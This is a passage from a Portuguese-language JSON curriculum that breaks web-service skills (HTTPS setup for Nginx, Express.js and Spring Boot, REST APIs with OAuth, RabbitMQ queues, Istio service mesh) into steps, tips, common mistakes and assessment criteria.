                                "Sem logs de erro em /var/log/nginx/error.log relacionados a SSL"
                              ],
                              "assessmentCriteria": [
                                "Certificado Let's Encrypt válido com renovação automática configurada",
                                "Configuração Nginx sem erros de sintaxe e reinício bem-sucedido",
                                "Redirecionamento HTTP->HTTPS e HSTS implementados corretamente",
                                "Criptografia TLS 1.2+ com ciphers fortes",
                                "Testes de segurança passam (Qualys SSL Labs >= A)",
                                "Documentação de passos para troubleshooting"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender TLS handshake e portas TCP/443",
                                "Segurança da Informação: Mitigação de MITM e criptografia assimétrica",
                                "Desenvolvimento Web: Integração com front-end (mixed content avoidance)",
                                "Administração de Sistemas: Gerenciamento de serviços e automação com cron"
                              ],
                              "realWorldApplication": "Proteger comunicações em aplicações web como e-commerces, APIs bancárias e sites corporativos, prevenindo interceptação de dados sensíveis (senhas, cartões), atendendo regulamentações como LGPD/GDPR e melhorando SEO no Google."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.3",
                            "name": "Integrar HTTPS em APIs REST",
                            "description": "Habilitar HTTPS em APIs desenvolvidas com frameworks como Express.js ou Spring Boot, testar com ferramentas como curl e Postman, e analisar logs de erros de certificado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Gerar ou Obter Certificados SSL/TLS",
                                  "subSteps": [
                                    "Instale OpenSSL se não estiver disponível (ex: brew install openssl no macOS).",
                                    "Gere um certificado self-signed para desenvolvimento: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes.",
                                    "Preencha os campos solicitados (Common Name deve ser localhost ou IP do servidor).",
                                    "Para produção, registre-se no Let's Encrypt e use certbot para obter certificados gratuitos.",
                                    "Valide os arquivos gerados com openssl x509 -in cert.pem -text -noout."
                                  ],
                                  "verification": "Execute openssl verify -CAfile cert.pem cert.pem e confirme 'OK'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Terminal/CLI"
                                  ],
                                  "tips": "Use self-signed apenas para dev; evite em produção para não expor usuários a warnings.",
                                  "learningObjective": "Compreender geração e validação básica de certificados SSL/TLS.",
                                  "commonMistakes": [
                                    "Esquecer de especificar Common Name como localhost",
                                    "Usar certificados expirados",
                                    "Não validar com openssl verify"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar HTTPS no Framework (Exemplo: Express.js)",
                                  "subSteps": [
                                    "Crie um app Express.js básico se não existir: npm init -y && npm install express.",
                                    "Carregue os certificados no código: const https = require('https'); const fs = require('fs'); const options = { key: fs.readFileSync('key.pem'), cert: fs.readFileSync('cert.pem') };",
                                    "Crie servidor HTTPS: https.createServer(options, app).listen(443, () => console.log('HTTPS on 443'));",
                                    "Adicione middleware para redirecionar HTTP para HTTPS em produção.",
                                    "Teste localmente acessando https://localhost:443 no navegador (aceite warning self-signed)."
                                  ],
                                  "verification": "Acesse https://localhost:443/api/endpoint e veja resposta sem erros de conexão.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Node.js",
                                    "Express.js",
                                    "Arquivos key.pem e cert.pem"
                                  ],
                                  "tips": "Use variáveis de ambiente para caminhos de certificados em produção.",
                                  "learningObjective": "Configurar servidor HTTPS em Express.js usando opções de certificado.",
                                  "commonMistakes": [
                                    "Porta errada (use 443 para HTTPS)",
                                    "Esquecer fs.readFileSync",
                                    "Não lidar com warnings de self-signed"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar para Spring Boot (Alternativa Java)",
                                  "subSteps": [
                                    "Adicione dependência Spring Boot Starter Web em pom.xml.",
                                    "Coloque key.pem e cert.pem em src/main/resources.",
                                    "Crie application.yml: server.ssl.key-store: classpath:keystore.p12 (converta pem para p12 com openssl pkcs12 -export).",
                                    "Configure server.ssl.key-store-password e server.port: 8443.",
                                    "Anotação @SpringBootApplication e rode a app."
                                  ],
                                  "verification": "Acesse https://localhost:8443/api/endpoint e confirme resposta.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Maven/Gradle",
                                    "Spring Boot",
                                    "Certificados convertidos para JKS/P12"
                                  ],
                                  "tips": "Converta PEM para PKCS12: openssl pkcs12 -export -in cert.pem -inkey key.pem -out keystore.p12.",
                                  "learningObjective": "Adaptar configuração HTTPS para frameworks Java como Spring Boot.",
                                  "commonMistakes": [
                                    "Formato de keystore errado",
                                    "Senha incorreta no yml",
                                    "Porta HTTP em vez de HTTPS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar API HTTPS com Ferramentas",
                                  "subSteps": [
                                    "Use curl: curl -k https://localhost:443/api/users (flag -k ignora self-signed).",
                                    "Configure Postman: Nova requisição GET/POST para https://localhost:443, desabilite SSL verification em Settings.",
                                    "Teste endpoints protegidos (ex: com auth JWT sobre HTTPS).",
                                    "Verifique headers: curl -I -k https://localhost:443 (confirme TLS version).",
                                    "Salve coleções no Postman para testes recorrentes."
                                  ],
                                  "verification": "Todas requisições retornam 200 OK sem erros de SSL.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "curl",
                                    "Postman instalado"
                                  ],
                                  "tips": "Em prod, remova -k e use certificados válidos.",
                                  "learningObjective": "Validar APIs HTTPS com ferramentas padrão de teste.",
                                  "commonMistakes": [
                                    "Esquecer -k no curl para self-signed",
                                    "SSL verification on no Postman",
                                    "Testar porta errada"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Logs de Erros de Certificado",
                                  "subSteps": [
                                    "Adicione logging no Express: app.use((err, req, res, next) => { console.error(err); });",
                                    "Simule erros: curl https://localhost:443 com certificado inválido ou hostname errado.",
                                    "Verifique logs do Node/Spring para erros como 'DEPTH_ZERO_SELF_SIGNED_CERT' ou 'ERR_SSL_PROTOCOL_ERROR'.",
                                    "Use openssl s_client -connect localhost:443 para debug TLS handshake.",
                                    "Corrija issues comuns: datas do cert, permissões de arquivos."
                                  ],
                                  "verification": "Logs mostram handshake bem-sucedido e sem erros SSL.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Logs do app",
                                    "openssl s_client"
                                  ],
                                  "tips": "Aumente nível de log para debug em Spring: logging.level.org.springframework.boot.web.embedded.tomcat=DEBUG.",
                                  "learningObjective": "Diagnosticar e resolver erros de certificado via logs.",
                                  "commonMistakes": [
                                    "Ignorar hostname mismatch",
                                    "Certificados com datas erradas",
                                    "Permissões 777 em keys"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API Express.js de e-commerce, integre HTTPS gerando cert.pem/key.pem, configure https.createServer(options, app).listen(443), teste POST /orders com curl -k -d '{\"item\":\"laptop\"}' https://localhost:443/orders, e debug logs para erro 'self-signed certificate' simulando cliente sem -k.",
                              "finalVerifications": [
                                "API responde em HTTPS sem warnings no navegador (aceitando self-signed).",
                                "curl -k retorna 200 em todos endpoints HTTPS.",
                                "Postman testes passam com SSL off apenas para dev.",
                                "Logs mostram TLS 1.2+ handshake.",
                                "Redirecionamento HTTP->HTTPS funciona.",
                                "openssl s_client confirma certificado válido."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta de certificados sem erros de carregamento.",
                                "Servidor escuta exclusivamente em HTTPS (porta 443/8443).",
                                "Testes com curl/Postman cobrem GET/POST/PUT/DELETE.",
                                "Análise de logs identifica e corrige 3 erros comuns de SSL.",
                                "Código usa boas práticas (env vars para certs, middleware de erro).",
                                "Explicação clara de diferenças dev vs prod."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender TLS handshake e cipher suites.",
                                "Segurança da Informação: Mitigação de MITM attacks via HTTPS.",
                                "Desenvolvimento Full-Stack: Integração com front-end (fetch com https).",
                                "Administração de Sistemas: Deploy com Nginx reverse proxy para HTTPS.",
                                "Criptografia: Conceitos de chaves assimétricas e certificados X.509."
                              ],
                              "realWorldApplication": "Em apps como Netflix ou bancos (ex: Nubank APIs), HTTPS previne interceptação de dados sensíveis como tokens JWT ou cartões de crédito durante chamadas REST, garantindo conformidade com PCI-DSS e GDPR."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.5",
                    "name": "Integração e Deploy de Serviços",
                    "description": "Estratégias para integrar serviços em aplicações distribuídas e implantá-los na nuvem.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.5.1",
                        "name": "Estratégias de Integração de Serviços em Aplicações Distribuídas",
                        "description": "Conceitos e técnicas para conectar serviços independentes em arquiteturas distribuídas, garantindo comunicação eficiente, escalabilidade e resiliência.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.1.1",
                            "name": "Implementar Integração via APIs RESTful",
                            "description": "Desenvolver e consumir APIs REST para integrar serviços, utilizando padrões como JSON para troca de dados, autenticação OAuth e gerenciamento de erros em cenários distribuídos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de REST e Configurar Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Estude os princípios REST: stateless, recursos uniformes, métodos HTTP (GET, POST, PUT, DELETE).",
                                    "Instale ferramentas: Node.js/Express ou Spring Boot, Postman para testes, Git para versionamento.",
                                    "Crie um projeto inicial com estrutura de pastas: controllers, models, routes.",
                                    "Configure servidor local e teste um endpoint básico /health.",
                                    "Revise padrões JSON para troca de dados (schemas com Joi ou JSON Schema)."
                                  ],
                                  "verification": "Servidor roda localmente em localhost:3000 e responde a GET /health com status 200 e JSON {status: 'ok'}.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Node.js v18+, npm/yarn",
                                    "Postman ou Insomnia",
                                    "Editor VS Code",
                                    "Documentação RESTful (MDN ou Richardson Maturity Model)"
                                  ],
                                  "tips": "Sempre use HTTPS em produção; documente endpoints com Swagger/OpenAPI desde o início.",
                                  "learningObjective": "Compreender os pilares do REST e preparar um ambiente funcional para desenvolvimento de APIs.",
                                  "commonMistakes": [
                                    "Confundir REST com SOAP (REST é leve e HTTP-based)",
                                    "Ignorar idempotência em PUT/DELETE",
                                    "Não versionar endpoints (/v1/users)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver API REST Simples com Troca de Dados em JSON",
                                  "subSteps": [
                                    "Defina modelos de dados (ex: User com id, name, email) e valide com middleware.",
                                    "Crie endpoints CRUD: GET /users, POST /users, GET /users/:id, PUT /users/:id, DELETE /users/:id.",
                                    "Implemente serialização/deserialização JSON usando body-parser ou equivalente.",
                                    "Adicione paginação e filtros (query params como ?page=1&limit=10).",
                                    "Teste todos endpoints com Postman, verificando status codes (200, 201, 404)."
                                  ],
                                  "verification": "CRUD completo funciona: liste usuários, crie novo (retorna 201 com ID), atualize e delete com respostas JSON corretas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Framework backend (Express.js ou Flask)",
                                    "Banco de dados leve (SQLite ou MongoDB)",
                                    "Postman Collections para testes automatizados"
                                  ],
                                  "tips": "Use HATEOAS para links em respostas JSON; mantenha payloads leves (<1MB).",
                                  "learningObjective": "Construir uma API REST funcional com manipulação de dados JSON e operações CRUD.",
                                  "commonMistakes": [
                                    "Retornar dados sensíveis em JSON (ex: senhas)",
                                    "Não usar status codes apropriados (ex: 400 para bad request)",
                                    "Ignorar validação de entrada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Autenticação OAuth 2.0",
                                  "subSteps": [
                                    "Escolha fluxo OAuth (Authorization Code para web apps) e integre provedor (Auth0, Google OAuth ou passport.js).",
                                    "Configure rotas protegidas com middleware JWT (decode token em Authorization header).",
                                    "Gere tokens de acesso/refresh após login, valide scopes (ex: read:users).",
                                    "Adicione logout (invalidate token) e refresh token logic.",
                                    "Teste fluxos: login, access protegido (401 sem token), refresh."
                                  ],
                                  "verification": "Endpoint protegido /users/profile retorna dados apenas com token válido; 401 sem auth.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Passport.js ou Spring Security OAuth",
                                    "Auth0 conta gratuita",
                                    "JWT debugger (jwt.io)",
                                    "Documentação OAuth 2.0 RFC"
                                  ],
                                  "tips": "Armazene refresh tokens hashed; use short-lived access tokens (15min).",
                                  "learningObjective": "Proteger APIs com OAuth, gerenciando tokens e autorização.",
                                  "commonMistakes": [
                                    "Expor secrets em client-side",
                                    "Não validar issuer/audience em JWT",
                                    "Reutilizar tokens expirados sem refresh"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Consumir API de um Cliente e Gerenciar Erros em Cenários Distribuídos",
                                  "subSteps": [
                                    "Crie cliente (React/Node ou curl) para consumir API: fetch/axios com baseURL e interceptors.",
                                    "Implemente retry logic para falhas transitórias (ex: 5xx com exponential backoff).",
                                    "Gerencie erros: timeouts, 4xx/5xx com mensagens customizadas, circuit breaker (opcional com Hystrix).",
                                    "Simule rede distribuída: use Docker para dois containers (API + cliente).",
                                    "Log erros com Winston ou ELK, monitore com Prometheus."
                                  ],
                                  "verification": "Cliente consome API com sucesso e retry após simular falha; logs mostram erros tratados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Axios/Fetch API",
                                    "Docker Compose",
                                    "Biblioteca retry-axios",
                                    "Ferramenta de log (Winston)"
                                  ],
                                  "tips": "Sempre inclua idempotency keys em requests POST; use health checks /health.",
                                  "learningObjective": "Integrar cliente-servidor com resiliência a erros em ambientes distribuídos.",
                                  "commonMistakes": [
                                    "Não tratar CORS em cross-origin",
                                    "Bloquear UI em requests síncronos",
                                    "Ignorar rate limiting"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Documentar e Deploy da Integração",
                                  "subSteps": [
                                    "Escreva testes unitários/integração (Jest/Supertest) cobrindo 80% code.",
                                    "Gere docs automáticas com Swagger e valide contratos com Pact.",
                                    "Deploy em cloud (Heroku/Vercel ou AWS Lambda) com CI/CD (GitHub Actions).",
                                    "Monitore em produção: logs, métricas (response time <200ms), alertas.",
                                    "Realize load test com Artillery ou JMeter."
                                  ],
                                  "verification": "Testes passam 100%, docs acessíveis em /api-docs, deploy live com integração funcionando.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Swagger UI",
                                    "Jest/Mocha",
                                    "Docker",
                                    "GitHub Actions YAML",
                                    "JMeter"
                                  ],
                                  "tips": "Use feature flags para rollouts; versionar API semanticamente.",
                                  "learningObjective": "Garantir qualidade e escalabilidade da integração via testes e deploy.",
                                  "commonMistakes": [
                                    "Testes frágeis dependentes de DB real",
                                    "Deploy sem migrations",
                                    "Falta de monitoring"
                                  ]
                                }
                              ],
                              "practicalExample": "Integre um app de e-commerce frontend (React) com uma API backend de pagamentos (simulando Stripe) via REST: POST /charges com dados cartão (JSON), autenticação OAuth do merchant, retry em falhas de rede, exibindo status em dashboard.",
                              "finalVerifications": [
                                "API responde corretamente a todos CRUD com JSON válido e status HTTP apropriados.",
                                "Autenticação OAuth protege endpoints sensíveis (401/403 em acessos inválidos).",
                                "Cliente consome API com tratamento de erros (retry, timeouts) em cenários distribuídos.",
                                "Testes automatizados cobrem >80% e docs Swagger estão funcionais.",
                                "Deploy em produção acessível, com logs e métricas monitoradas.",
                                "Integração end-to-end funciona sem vazamento de dados sensíveis."
                              ],
                              "assessmentCriteria": [
                                "Uso correto de verbos HTTP, status codes e padrões JSON (HATEOAS opcional).",
                                "Implementação segura de OAuth com tokens JWT validados e scopes.",
                                "Resiliência a falhas: retry, circuit breaker, logging de erros.",
                                "Código limpo, modular (separação concerns) e versionado com Git.",
                                "Documentação completa e testes robustos (unit/integration).",
                                "Performance: response <300ms, escalável para 100 req/s."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: OAuth, JWT, prevenção de injeções (validação JSON).",
                                "Banco de Dados: Modelagem relacional/NoSQL para persistência de recursos.",
                                "DevOps: CI/CD, Docker, monitoring com Prometheus/Grafana.",
                                "Redes e Sistemas Distribuídos: Load balancing, service discovery.",
                                "Desenvolvimento Front-end: Consumo via Fetch/Axios em SPA."
                              ],
                              "realWorldApplication": "Em plataformas como Netflix (microsserviços integrados via REST), e-commerces (Shopify/Stripe APIs para pagamentos) ou apps mobile (integração backend com autenticação segura em apps distribuídos globalmente)."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.1.2",
                            "name": "Utilizar Message Queues para Comunicação Assíncrona",
                            "description": "Configurar filas de mensagens como RabbitMQ ou Apache Kafka para desacoplar serviços, lidando com eventos assíncronos, persistência e balanceamento de carga em aplicações distribuídas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial do RabbitMQ",
                                  "subSteps": [
                                    "Instale o RabbitMQ no ambiente local ou use Docker para containerização rápida.",
                                    "Configure o usuário administrativo e vhost via management UI (porta 15672).",
                                    "Crie uma exchange do tipo 'direct' e uma queue durável vinculada à exchange.",
                                    "Teste a conectividade básica publicando e consumindo uma mensagem simples via CLI.",
                                    "Configure autenticação segura com SSL/TLS para produção."
                                  ],
                                  "verification": "Acesse a UI de gerenciamento e confirme que a queue recebe e processa mensagens de teste sem perda.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Docker ou instalador RabbitMQ",
                                    "Erlang (pré-requisito)",
                                    "Postman ou curl para testes"
                                  ],
                                  "tips": [
                                    "Use Docker Compose para setup rápido: docker-compose up rabbitmq.",
                                    "Habilite plugins de management imediatamente."
                                  ],
                                  "learningObjective": "Compreender e configurar o ambiente básico de message queue para operação assíncrona.",
                                  "commonMistakes": [
                                    "Esquecer de instalar Erlang",
                                    "Não configurar queues duráveis levando a perda de mensagens",
                                    "Ignorar portas padrão (5672 AMQP, 15672 UI)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolvimento de Producer e Consumer Básicos",
                                  "subSteps": [
                                    "Implemente um producer em Node.js/Python usando bibliotecas como amqplib ou pika.",
                                    "Publique mensagens com routing key para a exchange criada.",
                                    "Crie um consumer que se inscreva na queue e processe mensagens com ACK manual.",
                                    "Teste envio de 100 mensagens e confirme consumo sem duplicatas.",
                                    "Adicione serialização JSON para payloads complexos."
                                  ],
                                  "verification": "Execute producer e consumer simultaneamente; verifique logs e contadores na UI RabbitMQ mostrando 100 mensagens processadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Node.js/Python",
                                    "Biblioteca amqplib (JS) ou pika (Python)",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": [
                                    "Sempre use channel.confirmSelect() para publisher confirms.",
                                    "Implemente retry logic no producer para falhas de conexão."
                                  ],
                                  "learningObjective": "Criar componentes desacoplados para comunicação assíncrona via message queues.",
                                  "commonMistakes": [
                                    "Não usar ACKs levando a reprocessamento infinito",
                                    "Routing keys incorretos causando mensagens perdidas",
                                    "Payloads não serializados causando erros de parsing"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementação de Persistência, Durabilidade e Tratamento de Erros",
                                  "subSteps": [
                                    "Configure queues e exchanges como duráveis e mensagens como persistent (delivery_mode=2).",
                                    "Implemente NACK e requeue em consumers para falhas transitórias.",
                                    "Configure Dead Letter Exchange (DLX) para mensagens rejeitadas após retries.",
                                    "Teste falha simulada (kill consumer) e confirme recuperação de mensagens persistidas.",
                                    "Monitore métricas como message rates e queue lengths via UI."
                                  ],
                                  "verification": "Simule crash do consumer; reinicie e confirme que mensagens não processadas são recuperadas e DLQ recebe falhas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Código do Step 2",
                                    "Documentação RabbitMQ sobre durability",
                                    "Ferramentas de monitoramento como Prometheus (opcional)"
                                  ],
                                  "tips": [
                                    "TTL em queues para evitar backlog infinito.",
                                    "Use x-dead-letter-exchange argument na queue."
                                  ],
                                  "learningObjective": "Garantir resiliência e não-perda de mensagens em cenários de falha.",
                                  "commonMistakes": [
                                    "Queues não duráveis perdendo dados em restart",
                                    "ACK prematuro antes de processamento completo",
                                    "Ausência de DLX causando perda silenciosa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integração em Aplicações Distribuídas com Balanceamento de Carga",
                                  "subSteps": [
                                    "Desenvolva múltiplos consumers (3+) em containers Docker para simular balanceamento.",
                                    "Configure RabbitMQ cluster com HA (high availability) queues.",
                                    "Integre com microserviços (ex: producer em API1, consumers em API2/API3).",
                                    "Teste balanceamento enviando mensagens em burst e monitore distribuição.",
                                    "Adicione idempotência com message IDs únicos para evitar duplicatas."
                                  ],
                                  "verification": "Execute cluster com 3 consumers; envie 300 mensagens e confirme distribuição ~100 cada via logs/UI.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Docker Compose para cluster RabbitMQ",
                                    "Microserviços em Node.js/Flask",
                                    "Kubernetes minikube (avançado)"
                                  ],
                                  "tips": [
                                    "Use consistent hashing para balanceamento justo.",
                                    "Monitore com rabbitmq_top plugin."
                                  ],
                                  "learningObjective": "Aplicar message queues para escalabilidade e desacoplamento em sistemas distribuídos.",
                                  "commonMistakes": [
                                    "Consumers sem idempotência processando duplicatas",
                                    "Cluster sem mirroring perdendo HA",
                                    "Sobrecarga em um consumer por falta de prefetch count"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimização e Monitoramento em Produção",
                                  "subSteps": [
                                    "Configure prefetch count e QoS para controle de fluxo.",
                                    "Integre tracing com headers (correlation_id) para debug.",
                                    "Setup alertas para queue lengths > threshold via Prometheus/Grafana.",
                                    "Teste performance com 10k msgs/s e otimize TTL/heartbeats.",
                                    "Compare com Kafka para casos high-throughput (opcional benchmark)."
                                  ],
                                  "verification": "Gere load test; confirme latência <100ms e zero perdas, com dashboards mostrando métricas estáveis.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Prometheus + Grafana exporter para RabbitMQ",
                                    "Load testing tool como Artillery",
                                    "Kafka docs para comparação"
                                  ],
                                  "tips": [
                                    "Prefetch=1 para processamento lento.",
                                    "Heartbeats evitam timeouts em redes lentas."
                                  ],
                                  "learningObjective": "Otimizar e monitorar message queues para ambientes de produção escaláveis.",
                                  "commonMistakes": [
                                    "Prefetch alto causando overload",
                                    "Sem tracing dificultando debug",
                                    "Ignorar backpressure levando a OOM"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce, o serviço de checkout (producer) enfileira pedidos na RabbitMQ. Serviços de estoque, pagamento e envio (consumers) processam assincronamente, com DLQ para falhas, garantindo escalabilidade Black Friday sem acoplamento.",
                              "finalVerifications": [
                                "Producer publica mensagens persistentes com sucesso (confirmados).",
                                "Múltiplos consumers balanceiam carga sem duplicatas ou perdas.",
                                "Sistema recupera de falhas (restart broker/consumer) sem perda de dados.",
                                "DLQ captura e gerencia mensagens falhadas.",
                                "Métricas de performance atendem thresholds (latência, throughput).",
                                "Tracing permite rastrear mensagem end-to-end."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta de durabilidade e HA (sem perdas em falhas).",
                                "Código limpo com ACK/NACK, idempotência e error handling.",
                                "Escalabilidade comprovada com múltiplos consumers e load test.",
                                "Monitoramento implementado com alertas e tracing.",
                                "Documentação de setup e troubleshooting.",
                                "Comparação com Kafka para casos adequados."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com Docker/Kubernetes para deploy.",
                                "Banco de Dados: Persistência de estado vs. queues para eventos.",
                                "Cloud Computing: Uso em AWS SQS/MSK ou Azure Service Bus.",
                                "Segurança: Autenticação, SSL e idempotência contra replays.",
                                "Análise de Dados: Streams para Kafka em big data pipelines."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam Kafka para streaming de eventos de usuários; Uber para geolocalização assíncrona; bancos para transações desacopladas, reduzindo latência e aumentando resiliência em microserviços."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.1.3",
                            "name": "Aplicar Padrões de Service Mesh",
                            "description": "Implementar service mesh como Istio ou Linkerd para gerenciar tráfego, segurança e observabilidade entre serviços em arquiteturas de microsserviços.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Service Mesh",
                                  "subSteps": [
                                    "Estude a arquitetura de service mesh: data plane (sidecars como Envoy) e control plane (Istiod para Istio).",
                                    "Analise benefícios: gerenciamento de tráfego, segurança mTLS e observabilidade distribuída.",
                                    "Compare Istio e Linkerd: Istio mais feature-rich, Linkerd mais leve e simples.",
                                    "Revise casos de uso em microsserviços: fault tolerance, A/B testing e circuit breaking.",
                                    "Leia documentação oficial de Istio para conceitos chave como gateways e proxies."
                                  ],
                                  "verification": "Resuma em um diagrama os componentes principais e explique verbalmente os benefícios.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação Istio (istio.io)",
                                    "Documentação Linkerd (linkerd.io)",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Comece com vídeos curtos no YouTube canal oficial Istio para visualização rápida.",
                                  "learningObjective": "Dominar conceitos teóricos para fundamentar implementações práticas.",
                                  "commonMistakes": [
                                    "Confundir data plane com control plane",
                                    "Ignorar overhead de performance dos sidecars"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar Ambiente e Instalar Service Mesh",
                                  "subSteps": [
                                    "Instale Minikube ou Kind para cluster Kubernetes local.",
                                    "Deploy um conjunto de microsserviços sample (ex: Hipster Shop do Istio).",
                                    "Instale Istio via istioctl: 'istioctl install --set profile=demo'.",
                                    "Habilite automatic sidecar injection no namespace default.",
                                    "Verifique instalação com 'istioctl analyze' e dashboard Kiali."
                                  ],
                                  "verification": "Execute 'kubectl get pods' e confirme sidecars Envoy injetados em todos pods.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Minikube/Kind",
                                    "Istio CLI (istioctl)",
                                    "Sample app: git clone istio/hipster-shop"
                                  ],
                                  "tips": "Use profile 'demo' para features completas sem complexidade excessiva.",
                                  "learningObjective": "Configurar infraestrutura base para experimentação.",
                                  "commonMistakes": [
                                    "Não habilitar sidecar injection",
                                    "Cluster sem recursos suficientes (aumente CPU/RAM)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Gerenciamento de Tráfego",
                                  "subSteps": [
                                    "Crie VirtualService para roteamento baseado em headers ou weights (ex: 90/10 split).",
                                    "Configure DestinationRule para subsets e load balancing.",
                                    "Implemente circuit breaker e retries via DestinationRule.",
                                    "Aplique Gateway para entrada de tráfego externo.",
                                    "Teste com curl: roteamento canary deploy."
                                  ],
                                  "verification": "Simule tráfego e confirme splits via logs Kiali ou Grafana.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "kubectl",
                                    "Istio samples YAML",
                                    "curl ou httpie para testes"
                                  ],
                                  "tips": "Use 'istioctl dashboard kiali' para visualização gráfica intuitiva.",
                                  "learningObjective": "Controlar fluxo de tráfego dinamicamente entre serviços.",
                                  "commonMistakes": [
                                    "YAML malformatado em VirtualService",
                                    "Esquecer de labelar pods para matching"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Segurança e Observabilidade",
                                  "subSteps": [
                                    "Habilite mTLS peer-to-peer: 'istioctl x authn tls-check'.",
                                    "Crie AuthorizationPolicy e RequestAuthentication para RBAC.",
                                    "Integre Prometheus para métricas e Jaeger para tracing.",
                                    "Configure logging com Fluentd ou Loki.",
                                    "Acesse dashboards: Prometheus, Jaeger e Kiali."
                                  ],
                                  "verification": "Confirme mTLS ativo (curl falha sem certs) e traces end-to-end no Jaeger.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Jaeger all-in-one",
                                    "Prometheus via Istio addon",
                                    "Kiali dashboard"
                                  ],
                                  "tips": "Ative addons Istio com 'kubectl apply -f samples/addons'.",
                                  "learningObjective": "Garantir comunicação segura e visibilidade total.",
                                  "commonMistakes": [
                                    "mTLS STRICT sem permissão gradual",
                                    "Portas erradas em tracing"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Otimizar e Documentar",
                                  "subSteps": [
                                    "Execute chaos testing com ferramentas como Chaos Mesh.",
                                    "Monitore métricas: latência, error rates e throughput.",
                                    "Otimize configurações baseadas em observações (ex: tune timeouts).",
                                    "Documente CRDs aplicados e lições aprendidas.",
                                    "Cleanup: desinstale Istio e cluster."
                                  ],
                                  "verification": "Gere relatório com screenshots de dashboards e testes bem-sucedidos.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Chaos Mesh (opcional)",
                                    "Notebook para docs"
                                  ],
                                  "tips": "Automatize testes com scripts bash para reprodutibilidade.",
                                  "learningObjective": "Validar implementação em cenários reais e iterar.",
                                  "commonMistakes": [
                                    "Ignorar cleanup de recursos",
                                    "Testes insuficientes em edge cases"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação de e-commerce com microsserviços (frontend, catálogo, carrinho, pagamento), injete Istio sidecars, configure VirtualService para 20% tráfego em versão v2 do carrinho (canary), habilite mTLS total e visualize traces de uma compra end-to-end no Jaeger, confirmando latência <200ms e zero falhas de segurança.",
                              "finalVerifications": [
                                "Sidecars injetados corretamente em todos serviços.",
                                "Tráfego roteado via VirtualService com splits funcionais.",
                                "mTLS ativo com autenticação mútua verificada.",
                                "Métricas disponíveis no Prometheus e traces no Jaeger.",
                                "Kiali dashboard mostra topologia e health checks.",
